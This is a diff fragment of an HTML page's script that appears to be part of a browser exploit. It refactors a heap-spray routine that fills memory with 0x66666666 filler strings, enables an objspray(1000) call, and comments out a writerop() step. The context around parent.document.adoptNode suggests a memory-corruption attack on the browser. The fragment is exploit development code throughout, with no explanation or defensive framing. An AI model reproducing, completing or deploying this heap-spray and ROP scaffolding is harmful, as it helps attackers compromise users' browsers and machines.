@@ -75,28 +75,30 @@ if (parent.document.adoptNode) {
 		b[0]= new String(a);
 		//ert("");
 	}
+	
+	var str= new Array();
+	for(var j=0;j<0x100; j+=4){
+		str[j/4]= new String("");
+		for(var i=0;i<j/4; i++){
+			str[j/4]+= u32_to_unicode(0x66666666);
+		}
+	}
 
 	//var obj= new Array();
 	function spray(size, repeat) {
 		var obj= new Array();
-		var a = new String("");
-		var crashval=0x70000000 | size << 16;
-
-		for (var j = 0; j < size; j+=4){
-			a+= u32_to_unicode(0x66666666);
-		}
 		
-		for (var j = 0; j < repeat; j++) obj[j]=new String(a);
+		for (var j = 0; j < repeat; j++) obj[j]=new String(str[size]);
 	}
 
-	function objspray(limit) {
-		for(var j=limit;j>=0x18;j-=4){
-			for(var i=0;i<0x1;i++) spray(j, 1000);
+	function objspray(repeat) {
+		for(var j=0;j<str.length;j++){
+			spray(j, repeat);
 		}
 	}
-	//objspray(0x200);
+	objspray(1000);
 	
-	writerop();
+	//writerop();
 </script>
 <p>Middle of Page</p>
 <script></script>
